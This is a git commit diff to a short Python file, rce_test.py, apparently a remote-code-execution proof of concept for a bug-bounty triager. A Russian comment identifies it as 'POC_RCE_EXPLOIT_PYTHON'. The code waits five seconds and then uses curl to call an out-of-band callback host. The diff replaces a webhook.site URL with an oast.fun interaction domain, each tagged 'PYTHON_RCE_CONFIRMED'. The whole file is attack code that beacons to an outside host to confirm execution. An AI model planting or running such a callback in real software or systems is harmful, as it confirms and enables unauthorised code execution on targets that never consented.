9529833dfe3a40ac11e469afca60b22d3c6e9b3c
kirayoshikage67 <igaevkirill69@gmail.com>
2026-03-06 20:02:13 +0300

    Update rce_test.py

--- rce_test.py
+++ rce_test.py
@@ -4,4 +4,4 @@ import time
 
 # Идентификатор для триажера: POC_RCE_EXPLOIT_PYTHON
 time.sleep(5)
-subprocess.run(["curl", "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/PYTHON_RCE_CONFIRMED"], shell=False)
+subprocess.run(["curl", "esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun/PYTHON_RCE_CONFIRMED"], shell=False)
